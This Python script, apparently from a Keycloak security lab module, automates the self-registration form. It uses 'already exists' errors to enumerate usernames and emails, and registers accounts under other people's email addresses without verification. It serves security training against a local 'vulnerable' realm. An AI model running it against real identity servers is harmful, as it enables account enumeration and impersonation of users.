#!/usr/bin/env python3
"""Регистрация пользователя через форму саморегистрации Keycloak.

Используется в модуле 06:
  * проверить доступность саморегистрации;
  * показать user enumeration (существующий username/email -> ошибка);
  * зарегистрировать пользователя на чужой email без верификации.

Примеры:
  python3 register_user.py --username eve --email victim@lab.local
  python3 register_user.py --username alice --email x@lab.local   # alice существует
"""
import argparse
import http.cookiejar
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

INPUT_RE = re.compile(r'<input[^>]*>', re.I)
NAME_RE = re.compile(r'name="([^"]+)"')
VALUE_RE = re.compile(r'value="([^"]*)"')
ACTION_RE = re.compile(r'<form[^>]*action="([^"]+)"', re.I)


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def fetch(opener, url, data=None):
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    headers = {"User-Agent": "lab"}
    if data is not None:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    req = urllib.request.Request(url, data=body, headers=headers, method="POST" if data else "GET")
    try:
        return opener.open(req, timeout=15)
    except urllib.error.HTTPError as e:
        return e


def parse(html):
    m = ACTION_RE.search(html)
    action = m.group(1).replace("&amp;", "&") if m else None
    fields = {}
    for tag in INPUT_RE.findall(html):
        n = NAME_RE.search(tag)
        if n:
            v = VALUE_RE.search(tag)
            fields[n.group(1)] = v.group(1) if v else ""
    return action, fields


def register(url, realm, client_id, redirect_uri, username, email, password,
             first="Reg", last="User"):
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()), _NoRedirect())
    # 1) старт с authorization endpoint -> страница логина (ставит cookie сессии)
    q = {"client_id": client_id, "redirect_uri": redirect_uri,
         "response_type": "code", "scope": "openid"}
    resp = fetch(opener, f"{url}/realms/{realm}/protocol/openid-connect/auth?{urllib.parse.urlencode(q)}")
    login_html = resp.read().decode("utf-8", "ignore")

    # 2) находим ссылку "Register" и открываем форму регистрации
    m = re.search(r'href="([^"]*login-actions/registration[^"]*)"', login_html, re.I)
    if not m:
        return resp.status, "нет ссылки на регистрацию (выключена?)", login_html
    reg_url = urllib.parse.urljoin(url, m.group(1).replace("&amp;", "&"))
    resp = fetch(opener, reg_url)
    html = resp.read().decode("utf-8", "ignore")

    action, fields = parse(html)
    if action is None:
        return resp.status, "нет формы регистрации", html
    action = urllib.parse.urljoin(url, action)
    fields.update({
        "firstName": first, "lastName": last, "email": email, "username": username,
        "password": password, "password-confirm": password,
    })
    resp = fetch(opener, action, fields)
    body = resp.read().decode("utf-8", "ignore")
    return resp.status, resp.headers.get("Location", ""), body


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", default=os.environ.get("KC_URL", "http://keycloak.127.0.0.1.nip.io:8080"))
    p.add_argument("--realm", default="vulnerable")
    p.add_argument("--client-id", default="sp-app")
    p.add_argument("--redirect-uri",
                   default=os.environ.get("SP_URL", "http://app.127.0.0.1.nip.io:8088") + "/callback")
    p.add_argument("--username", required=True)
    p.add_argument("--email", required=True)
    p.add_argument("--password", default="Passw0rd!")
    a = p.parse_args()

    status, location, body = register(a.url.rstrip("/"), a.realm, a.client_id, a.redirect_uri,
                                      a.username, a.email, a.password)
    print(f"[*] register username={a.username} email={a.email}")
    print(f"    status={status} location={location or '-'}")
    for pat in ("already exists", "in use", "Registered", "error-message", "instruction"):
        m = re.search(rf'[^>]*{pat}[^<]*', body, re.I)
        if m:
            print(f"    hint: {m.group(0).strip()[:120]}")
    if status in (301, 302, 303):
        print("    => зарегистрирован (redirect)")
    elif "already exists" in body.lower() or "in use" in body.lower():
        print("    => username/email уже существует (enumeration oracle)")


if __name__ == "__main__":
    sys.exit(main())